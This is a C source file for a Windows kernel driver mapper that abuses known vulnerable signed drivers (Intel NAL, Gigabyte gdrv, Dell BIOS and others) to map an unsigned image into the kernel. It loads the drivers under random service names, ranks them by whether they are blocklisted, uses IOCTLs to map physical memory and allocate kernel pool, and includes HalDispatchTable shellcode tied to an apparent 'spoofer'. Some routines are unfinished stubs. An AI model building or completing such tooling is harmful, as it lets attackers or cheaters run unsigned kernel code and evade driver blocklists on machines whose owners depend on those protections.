/*
 * Agnostic Mapper Implementation
 * Unified interface for multiple vulnerable drivers
 */

#include "agnostic_mapper.h"
#include "vuln_driver_config.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// Internal structures for IOCTL buffers

typedef struct {
    ULONG64 case_number;
    ULONG64 reserved;
    ULONG64 return_status;
    ULONG64 return_ptr;
    ULONG64 phys_addr;
    ULONG64 size;
} MAP_IO_SPACE_BUFFER;

typedef struct {
    ULONG64 case_number;
    ULONG64 reserved;
    ULONG64 source;
    ULONG64 destination;
    ULONG64 length;
} COPY_MEMORY_BUFFER;

typedef struct {
    ULONG64 case_number;
    ULONG64 reserved;
    ULONG64 reserved2;
    ULONG64 virt_addr;
    ULONG64 reserved3;
    ULONG64 size;
} UNMAP_IO_SPACE_BUFFER;

typedef struct {
    ULONG64 case_number;
    ULONG64 reserved;
    ULONG64 return_physical_address;
    ULONG64 size;
    ULONG64 pool_type;
} ALLOCATE_POOL_BUFFER;

typedef struct {
    ULONG64 case_number;
    ULONG64 virtual_address;
    ULONG64 physical_address;
} GET_PHYS_ADDR_BUFFER;

// System module information for kernel base

typedef struct {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBaseAddress;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} SYSTEM_MODULE;

typedef struct {
    ULONG ModulesCount;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFO;

typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// HalDispatchTable shellcode for execution
static BYTE g_ExecShellcode[] = {
    0x48, 0x89, 0x4C, 0x24, 0x08,       // mov [rsp+8], rcx
    0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
    0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0 (placeholder for context)
    0x00, 0x00, 0x00, 0x00,
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, // mov rax, 0 (placeholder for entry)
    0x00, 0x00, 0x00, 0x00,
    0xFF, 0xD0,                         // call rax
    0x48, 0x83, 0xC4, 0x28,             // add rsp, 0x28
    0xC3                                // ret
};

// Helper function declarations
static BOOL LoadDriverFile(MAPPER_CONTEXT* ctx);
static BOOL StartDriverService(MAPPER_CONTEXT* ctx);
static BOOL StopDriverService(MAPPER_CONTEXT* ctx);
static BOOL UnloadDriverFile(MAPPER_CONTEXT* ctx);
static ULONG64 GetKernelBaseInternal(void);
static BOOL SendIoctl(MAPPER_CONTEXT* ctx, PVOID inBuffer, DWORD inSize, PVOID outBuffer, DWORD outSize);
static BOOL ReadKernelMemoryInternal(MAPPER_CONTEXT* ctx, ULONG64 kernelAddr, PVOID buffer, SIZE_T size);
static BOOL WriteKernelMemoryInternal(MAPPER_CONTEXT* ctx, ULONG64 kernelAddr, PVOID buffer, SIZE_T size);
static BOOL ExecuteInKernel(MAPPER_CONTEXT* ctx, ULONG64 funcAddr, ULONG64 context);

// ==================== INITIALIZATION ====================

MAPPER_RESULT MapperInit(MAPPER_CONTEXT* ctx, VULN_DRIVER_TYPE driverType) {
    if (!ctx) {
        return MAPPER_ERROR_INVALID_PARAM;
    }
    
    memset(ctx, 0, sizeof(MAPPER_CONTEXT));
    ctx->hDevice = INVALID_HANDLE_VALUE;
    
    VULN_DRIVER_CONFIG* config = GetDriverConfig(driverType);
    if (!config) {
        MAPPER_SET_ERROR(ctx, MAPPER_ERROR_INVALID_DRIVER_CONFIG, "Invalid driver type specified");
        return MAPPER_ERROR_INVALID_DRIVER_CONFIG;
    }
    
    ctx->DriverConfig = config;
    
    // Check compatibility
    OSVERSIONINFOEXW osInfo = {0};
    osInfo.dwOSVersionInfoSize = sizeof(osInfo);
    
    typedef NTSTATUS (NTAPI *pRtlGetVersion)(PRTL_OSVERSIONINFOW);
    pRtlGetVersion RtlGetVersion = (pRtlGetVersion)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    
    if (RtlGetVersion) {
        RtlGetVersion((PRTL_OSVERSIONINFOW)&osInfo);
        if (!IsDriverCompatible(config, osInfo.dwBuildNumber)) {
            char msg[256];
            sprintf_s(msg, sizeof(msg), 
                "Driver %s not compatible with Windows build %lu", 
                config->Name, osInfo.dwBuildNumber);
            MAPPER_SET_ERROR(ctx, MAPPER_ERROR_SYSTEM_INCOMPATIBLE, msg);
            return MAPPER_ERROR_SYSTEM_INCOMPATIBLE;
        }
    }
    
    if (config->IsBlocklisted) {
        char msg[256];
        sprintf_s(msg, sizeof(msg), 
            "Driver %s is known to be blocklisted", config->Name);
        MAPPER_SET_ERROR(ctx, MAPPER_ERROR_DRIVER_BLOCKED, msg);
        return MAPPER_ERROR_DRIVER_BLOCKED;
    }
    
    ctx->IsInitialized = TRUE;
    return MAPPER_SUCCESS;
}

MAPPER_RESULT MapperInitAuto(MAPPER_CONTEXT* ctx) {
    if (!ctx) {
        return MAPPER_ERROR_INVALID_PARAM;
    }
    
    // Try each driver type in order of preference
    VULN_DRIVER_TYPE priority[] = {
        VULN_DRIVER_INTEL_NAL,      // Most reliable
        VULN_DRIVER_GLAZIO,         // Similar to Intel NAL
        VULN_DRIVER_ASROCK_RGB,     // Good capabilities
        VULN_DRIVER_PROCESS_HACKER, // Powerful but often blocklisted
        VULN_DRIVER_GIGABYTE_GDRV,  // Limited but works
        VULN_DRIVER_DELL_BIOS       // Last resort
    };
    
    for (int i = 0; i < sizeof(priority)/sizeof(priority[0]); i++) {
        MAPPER_RESULT result = MapperInit(ctx, priority[i]);
        if (result == MAPPER_SUCCESS) {
            // Test if we can actually load it
            if (MapperTestDriverLoad(priority[i])) {
                ctx->DriverConfig->WasTested = TRUE;
                ctx->DriverConfig->CanLoad = TRUE;
                return MAPPER_SUCCESS;
            }
        }
    }
    
    memset(ctx, 0, sizeof(MAPPER_CONTEXT));
    MAPPER_SET_ERROR(ctx, MAPPER_ERROR_DRIVER_NOT_FOUND, 
        "No compatible vulnerable driver found");
    return MAPPER_ERROR_DRIVER_NOT_FOUND;
}

void MapperCleanup(MAPPER_CONTEXT* ctx) {
    if (!ctx) return;
    
    if (ctx->DriverLoaded) {
        MapperUnloadDriver(ctx);
    }
    
    if (ctx->hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(ctx->hDevice);
        ctx->hDevice = INVALID_HANDLE_VALUE;
    }
    
    ctx->IsInitialized = FALSE;
}

// ==================== DRIVER LOADING ====================

static void GenerateRandomServiceName(char* buffer, size_t len, const char* prefix) {
    const char hex[] = "0123456789ABCDEF";
    
    size_t prefixLen = strlen(prefix);
    if (prefixLen >= len - 9) prefixLen = len - 9;
    
    memcpy(buffer, prefix, prefixLen);
    
    for (int i = 0; i < 8; i++) {
        buffer[prefixLen + i] = hex[rand() % 16];
    }
    buffer[prefixLen + 8] = '\0';
}

static BOOL LoadDriverFile(MAPPER_CONTEXT* ctx) {
    if (!ctx || !ctx->DriverConfig) return FALSE;
    
    // Generate random service name
    GenerateRandomServiceName(ctx->ServiceName, sizeof(ctx->ServiceName), 
        ctx->DriverConfig->ServiceNamePrefix);
    
    // Build device path
    sprintf_s(ctx->DevicePath, sizeof(ctx->DevicePath), 
        "\\\\.\\%s", ctx->ServiceName);
    
    // Copy driver file to temp location with random name
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    
    sprintf_s(ctx->DriverPath, MAX_PATH, "%s%s_%08X.sys",
        tempPath, ctx->DriverConfig->ServiceNamePrefix, 
        (DWORD)(rand() ^ GetTickCount()));
    
    // Copy driver file (would extract from resource in real implementation)
    // For now, assume the driver file is already available
    
    return TRUE;
}

static BOOL StartDriverService(MAPPER_CONTEXT* ctx) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) return FALSE;
    
    SC_HANDLE hService = CreateServiceA(
        hSCM,
        ctx->ServiceName,
        ctx->ServiceName,
        SERVICE_START | SERVICE_STOP | DELETE,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        ctx->DriverPath,
        NULL, NULL, NULL, NULL, NULL);
    
    if (!hService) {
        hService = OpenServiceA(hSCM, ctx->ServiceName, SERVICE_START | SERVICE_STOP | DELETE);
    }
    
    if (!hService) {
        CloseServiceHandle(hSCM);
        return FALSE;
    }
    
    BOOL result = StartServiceA(hService, 0, NULL);
    DWORD err = GetLastError();
    
    if (!result && err != ERROR_SERVICE_ALREADY_RUNNING) {
        DeleteService(hService);
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return FALSE;
    }
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return TRUE;
}

MAPPER_RESULT MapperLoadDriver(MAPPER_CONTEXT* ctx) {
    MAPPER_CHECK_INITIALIZED(ctx);
    
    if (ctx->DriverLoaded) {
        return MAPPER_SUCCESS; // Already loaded
    }
    
    // Prepare driver file
    if (!LoadDriverFile(ctx)) {
        MAPPER_SET_ERROR(ctx, MAPPER_ERROR_DRIVER_LOAD_FAILED, 
            "Failed to prepare driver file");
        return MAPPER_ERROR_DRIVER_LOAD_FAILED;
    }
    
    // Start the service
    if (!StartDriverService(ctx)) {
        MAPPER_SET_ERROR(ctx, MAPPER_ERROR_DRIVER_LOAD_FAILED,
            "Failed to start driver service");
        return MAPPER_ERROR_DRIVER_LOAD_FAILED;
    }
    
    // Open device
    ctx->hDevice = CreateFileA(ctx->DevicePath, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    
    if (ctx->hDevice == INVALID_HANDLE_VALUE) {
        StopDriverService(ctx);
        UnloadDriverFile(ctx);
        MAPPER_SET_ERROR(ctx, MAPPER_ERROR_DEVICE_OPEN_FAILED,
            "Failed to open driver device");
        return MAPPER_ERROR_DEVICE_OPEN_FAILED;
    }
    
    ctx->DriverLoaded = TRUE;
    
    // Get kernel base
    ctx->KernelBase = (PVOID)GetKernelBaseInternal();
    if (!ctx->KernelBase) {
        MapperUnloadDriver(ctx);
        MAPPER_SET_ERROR(ctx, MAPPER_ERROR_KERNEL_COMMUNICATION,
            "Failed to get kernel base address");
        return MAPPER_ERROR_KERNEL_COMMUNICATION;
    }
    
    return MAPPER_SUCCESS;
}

static BOOL StopDriverService(MAPPER_CONTEXT* ctx) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) return FALSE;
    
    SC_HANDLE hService = OpenServiceA(hSCM, ctx->ServiceName, SERVICE_STOP | DELETE);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return FALSE;
    }
    
    SERVICE_STATUS status;
    ControlService(hService, SERVICE_CONTROL_STOP, &status);
    DeleteService(hService);
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return TRUE;
}

static BOOL UnloadDriverFile(MAPPER_CONTEXT* ctx) {
    if (ctx->DriverPath[0]) {
        DeleteFileA(ctx->DriverPath);
        ctx->DriverPath[0] = '\0';
    }
    return TRUE;
}

MAPPER_RESULT MapperUnloadDriver(MAPPER_CONTEXT* ctx) {
    if (!ctx) return MAPPER_ERROR_INVALID_PARAM;
    
    if (ctx->hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(ctx->hDevice);
        ctx->hDevice = INVALID_HANDLE_VALUE;
    }
    
    if (ctx->DriverLoaded) {
        StopDriverService(ctx);
        UnloadDriverFile(ctx);
        ctx->DriverLoaded = FALSE;
    }
    
    return MAPPER_SUCCESS;
}

// ==================== IOCTL OPERATIONS ====================

static BOOL SendIoctl(MAPPER_CONTEXT* ctx, PVOID inBuffer, DWORD inSize, 
    PVOID outBuffer, DWORD outSize) {
    
    if (ctx->hDevice == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD bytesReturned = 0;
    return DeviceIoControl(ctx->hDevice, ctx->DriverConfig->IoctlCode,
        inBuffer, inSize, outBuffer, outSize, &bytesReturned, NULL);
}

static BOOL SendIoctlDirect(MAPPER_CONTEXT* ctx, DWORD ioctlCode, PVOID inBuffer, 
    DWORD inSize, PVOID outBuffer, DWORD outSize) {
    
    if (ctx->hDevice == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD bytesReturned = 0;
    return DeviceIoControl(ctx->hDevice, ioctlCode,
        inBuffer, inSize, outBuffer, outSize, &bytesReturned, NULL);
}

// ==================== MEMORY OPERATIONS ====================

static BOOL ReadKernelMemoryInternal(MAPPER_CONTEXT* ctx, ULONG64 kernelAddr, 
    PVOID buffer, SIZE_T size) {
    
    if (!ctx || !ctx->DriverLoaded) return FALSE;
    
    // Use physical address translation if available
    if (ctx->DriverConfig->SupportsPhysicalTranslation && 
        ctx->DriverConfig->CaseCopyMemory != 0) {
        
        // Map physical page and read
        // This is driver-specific implementation
        // For now, use the copy memory IOCTL
        
        // Get physical address
        GET_PHYS_ADDR_BUFFER physBuffer = {0};
        physBuffer.case_number = ctx->DriverConfig->CaseGetPhysAddr;
        physBuffer.virtual_address = kernelAddr;
        
        if (ctx->DriverConfig->CaseGetPhysAddr != 0) {
            if (!SendIoctl(ctx, &physBuffer, sizeof(physBuffer), 
                &physBuffer, sizeof(physBuffer))) {
                return FALSE;
            }
            
            // Map physical memory
            MAP_IO_SPACE_BUFFER mapBuffer = {0};
            mapBuffer.case_number = ctx->DriverConfig->CaseMapPhysical;
            mapBuffer.phys_addr = physBuffer.physical_address;
            mapBuffer.size = size;
            
            if (!SendIoctl(ctx, &mapBuffer, (DWORD)ctx->DriverConfig->BufferSizeMap,
                &mapBuffer, sizeof(mapBuffer))) {
                return FALSE;
            }
            
            // Read from mapped address
            // ... implementation depends on driver
            
            // Unmap
            UNMAP_IO_SPACE_BUFFER unmapBuffer = {0};
            unmapBuffer.case_number = ctx->DriverConfig->CaseUnmapPhysical;
            unmapBuffer.virt_addr = mapBuffer.return_ptr;
            unmapBuffer.size = size;
            SendIoctl(ctx, &unmapBuffer, (DWORD)ctx->DriverConfig->BufferSizeUnmap,
                &unmapBuffer, sizeof(unmapBuffer));
        }
    }
    
    // Fallback: Use HalDispatchTable exploitation
    // This is the original method from the spoofer
    return FALSE; // Not implemented in this snippet
}

static BOOL WriteKernelMemoryInternal(MAPPER_CONTEXT* ctx, ULONG64 kernelAddr, 
    PVOID buffer, SIZE_T size) {
    
    if (!ctx || !ctx->DriverLoaded) return FALSE;
    
    // Similar to read but in reverse
    // Implementation depends on driver capabilities
    
    return FALSE; // Not implemented in this snippet
}

MAPPER_RESULT MapperReadKernelMemory(MAPPER_CONTEXT* ctx, ULONG64 kernelAddr, 
    PVOID buffer, SIZE_T size) {
    
    MAPPER_CHECK_INITIALIZED(ctx);
    
    if (!ctx->DriverLoaded) {
        return MAPPER_ERROR_DRIVER_LOAD_FAILED;
    }
    
    if (ReadKernelMemoryInternal(ctx, kernelAddr, buffer, size)) {
        return MAPPER_SUCCESS;
    }
    
    return MAPPER_ERROR_KERNEL_COMMUNICATION;
}

MAPPER_RESULT MapperWriteKernelMemory(MAPPER_CONTEXT* ctx, ULONG64 kernelAddr, 
    PVOID buffer, SIZE_T size) {
    
    MAPPER_CHECK_INITIALIZED(ctx);
    
    if (!ctx->DriverLoaded) {
        return MAPPER_ERROR_DRIVER_LOAD_FAILED;
    }
    
    if (WriteKernelMemoryInternal(ctx, kernelAddr, buffer, size)) {
        return MAPPER_SUCCESS;
    }
    
    return MAPPER_ERROR_KERNEL_COMMUNICATION;
}

MAPPER_RESULT MapperAllocateKernelPool(MAPPER_CONTEXT* ctx, SIZE_T size, 
    ULONG64* outAddress) {
    
    MAPPER_CHECK_INITIALIZED(ctx);
    
    if (!ctx->DriverLoaded) {
        return MAPPER_ERROR_DRIVER_LOAD_FAILED;
    }
    
    if (!ctx->DriverConfig->SupportsPoolAllocation || 
        ctx->DriverConfig->CaseAllocatePool == 0) {
        return MAPPER_ERROR_UNSUPPORTED_OPERATION;
    }
    
    ALLOCATE_POOL_BUFFER allocBuffer = {0};
    allocBuffer.case_number = ctx->DriverConfig->CaseAllocatePool;
    allocBuffer.size = size;
    allocBuffer.pool_type = 0; // NonPagedPool
    
    if (!SendIoctl(ctx, &allocBuffer, (DWORD)ctx->DriverConfig->BufferSizeAlloc,
        &allocBuffer, sizeof(allocBuffer))) {
        return MAPPER_ERROR_KERNEL_COMMUNICATION;
    }
    
    if (allocBuffer.return_physical_address == 0) {
        return MAPPER_ERROR_MEMORY_ALLOCATION;
    }
    
    if (outAddress) {
        *outAddress = allocBuffer.return_physical_address;
    }
    
    return MAPPER_SUCCESS;
}

ULONG64 MapperGetKernelBase(MAPPER_CONTEXT* ctx) {
    if (!ctx || !ctx->IsInitialized) return 0;
    return (ULONG64)ctx->KernelBase;
}

ULONG64 MapperTranslateVirtualToPhysical(MAPPER_CONTEXT* ctx, ULONG64 virtualAddr) {
    MAPPER_CHECK_INITIALIZED(ctx);
    
    if (!ctx->DriverLoaded || !ctx->DriverConfig->SupportsPhysicalTranslation ||
        ctx->DriverConfig->CaseGetPhysAddr == 0) {
        return 0;
    }
    
    GET_PHYS_ADDR_BUFFER physBuffer = {0};
    physBuffer.case_number = ctx->DriverConfig->CaseGetPhysAddr;
    physBuffer.virtual_address = virtualAddr;
    
    if (!SendIoctl(ctx, &physBuffer, sizeof(physBuffer),
        &physBuffer, sizeof(physBuffer))) {
        return 0;
    }
    
    return physBuffer.physical_address;
}

// ==================== KERNEL BASE ====================

static ULONG64 GetKernelBaseInternal(void) {
    pNtQuerySystemInformation NtQuerySystemInformation = 
        (pNtQuerySystemInformation)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    
    if (!NtQuerySystemInformation) return 0;
    
    ULONG len = 0;
    NTSTATUS status = NtQuerySystemInformation(0x0B, NULL, 0, &len);
    if (len == 0) return 0;
    
    SYSTEM_MODULE_INFO* info = (SYSTEM_MODULE_INFO*)malloc(len);
    if (!info) return 0;
    
    status = NtQuerySystemInformation(0x0B, info, len, &len);
    if (status != 0) {
        free(info);
        return 0;
    }
    
    ULONG64 base = (ULONG64)info->Modules[0].ImageBaseAddress;
    free(info);
    
    return base;
}

// ==================== DRIVER MAPPING ====================

MAPPER_RESULT MapperMapImage(MAPPER_CONTEXT* ctx, PVOID imageBuffer, DWORD size, 
    ULONG64* outEntryPoint) {
    
    MAPPER_CHECK_INITIALIZED(ctx);
    
    if (!ctx->DriverLoaded) {
        return MAPPER_ERROR_DRIVER_LOAD_FAILED;
    }
    
    // PE parsing and mapping logic
    // This is a simplified version - the full implementation would:
    // 1. Parse PE headers
    // 2. Allocate kernel memory
    // 3. Copy sections
    // 4. Process relocations
    // 5. Resolve imports
    // 6. Return entry point
    
    if (!imageBuffer || size < sizeof(IMAGE_DOS_HEADER)) {
        return MAPPER_ERROR_INVALID_PARAM;
    }
    
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBuffer;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return MAPPER_ERROR_INVALID_PARAM;
    }
    
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((BYTE*)imageBuffer + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return MAPPER_ERROR_INVALID_PARAM;
    }
    
    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    
    // Allocate kernel pool for image
    ULONG64 kernelImage = 0;
    MAPPER_RESULT result = MapperAllocateKernelPool(ctx, imageSize, &kernelImage);
    if (result != MAPPER_SUCCESS) {
        return result;
    }
    
    // Copy image to allocated memory
    // This requires writing to kernel memory
    // ... implementation details
    
    if (outEntryPoint) {
        *outEntryPoint = kernelImage + nt->OptionalHeader.AddressOfEntryPoint;
    }
    
    return MAPPER_SUCCESS;
}

MAPPER_RESULT MapperExecuteEntry(MAPPER_CONTEXT* ctx, ULONG64 entryAddr) {
    MAPPER_CHECK_INITIALIZED(ctx);
    
    if (!ctx->DriverLoaded) {
        return MAPPER_ERROR_DRIVER_LOAD_FAILED;
    }
    
    // Execute DriverEntry via HalDispatchTable exploit
    // This is the method used by the original spoofer
    
    // Find HalDispatchTable
    // Patch entry to point to our shellcode
    // Trigger execution
    // Restore original value
    
    return MAPPER_ERROR_UNSUPPORTED_OPERATION; // Placeholder
}

MAPPER_RESULT MapperMapAndExecute(MAPPER_CONTEXT* ctx, PVOID imageBuffer, DWORD size) {
    ULONG64 entryPoint = 0;
    
    MAPPER_RESULT result = MapperMapImage(ctx, imageBuffer, size, &entryPoint);
    if (result != MAPPER_SUCCESS) {
        return result;
    }
    
    return MapperExecuteEntry(ctx, entryPoint);
}

// ==================== UTILITY FUNCTIONS ====================

void MapperEnumerateDrivers(PFN_DRIVER_ENUM_CALLBACK callback, PVOID userContext) {
    if (!callback) return;
    
    for (int i = 0; i < VULN_DRIVER_COUNT; i++) {
        VULN_DRIVER_CONFIG* config = GetDriverConfig((VULN_DRIVER_TYPE)i);
        if (config) {
            if (!callback(config, userContext)) {
                break; // Callback returned FALSE to stop enumeration
            }
        }
    }
}

typedef struct {
    VULN_DRIVER_TYPE BestDriver;
    int Priority;
} BEST_DRIVER_CONTEXT;

static BOOL BestDriverCallback(VULN_DRIVER_CONFIG* config, PVOID userContext) {
    BEST_DRIVER_CONTEXT* ctx = (BEST_DRIVER_CONTEXT*)userContext;
    
    if (!IsDriverAvailable(config)) {
        return TRUE; // Continue enumeration
    }
    
    // Priority based on capabilities
    int priority = 0;
    if (config->SupportsPoolAllocation) priority += 10;
    if (config->SupportsPhysicalTranslation) priority += 5;
    if (!config->IsBlocklisted) priority += 20;
    if (config->MaxMappingSize > 0x10000000) priority += 5;
    
    if (priority > ctx->Priority) {
        ctx->BestDriver = config->Type;
        ctx->Priority = priority;
    }
    
    return TRUE;
}

VULN_DRIVER_TYPE MapperGetBestAvailableDriver(void) {
    BEST_DRIVER_CONTEXT ctx = {0};
    ctx.BestDriver = VULN_DRIVER_COUNT; // Invalid
    ctx.Priority = -1;
    
    MapperEnumerateDrivers(BestDriverCallback, &ctx);
    
    return ctx.BestDriver;
}

const char* MapperGetErrorString(MAPPER_RESULT result) {
    switch (result) {
        case MAPPER_SUCCESS: return "Success";
        case MAPPER_ERROR_INVALID_PARAM: return "Invalid parameter";
        case MAPPER_ERROR_DRIVER_NOT_FOUND: return "No compatible driver found";
        case MAPPER_ERROR_DRIVER_BLOCKED: return "Driver is blocklisted";
        case MAPPER_ERROR_DRIVER_LOAD_FAILED: return "Failed to load driver";
        case MAPPER_ERROR_DEVICE_OPEN_FAILED: return "Failed to open device";
        case MAPPER_ERROR_MEMORY_ALLOCATION: return "Memory allocation failed";
        case MAPPER_ERROR_KERNEL_COMMUNICATION: return "Kernel communication failed";
        case MAPPER_ERROR_UNSUPPORTED_OPERATION: return "Operation not supported by driver";
        case MAPPER_ERROR_INVALID_DRIVER_CONFIG: return "Invalid driver configuration";
        case MAPPER_ERROR_SYSTEM_INCOMPATIBLE: return "System incompatible with driver";
        case MAPPER_ERROR_UNKNOWN: return "Unknown error";
        default: return "Undefined error code";
    }
}

const char* MapperGetLastError(MAPPER_CONTEXT* ctx) {
    if (!ctx) return "Invalid context";
    return ctx->LastErrorMsg;
}

BOOL MapperIsDriverAvailable(VULN_DRIVER_TYPE driverType) {
    VULN_DRIVER_CONFIG* config = GetDriverConfig(driverType);
    return IsDriverAvailable(config);
}

BOOL MapperTestDriverLoad(VULN_DRIVER_TYPE driverType) {
    MAPPER_CONTEXT ctx = {0};
    
    MAPPER_RESULT result = MapperInit(&ctx, driverType);
    if (result != MAPPER_SUCCESS) {
        return FALSE;
    }
    
    result = MapperLoadDriver(&ctx);
    BOOL success = (result == MAPPER_SUCCESS);
    
    if (success) {
        MapperUnloadDriver(&ctx);
    }
    
    MapperCleanup(&ctx);
    return success;
}
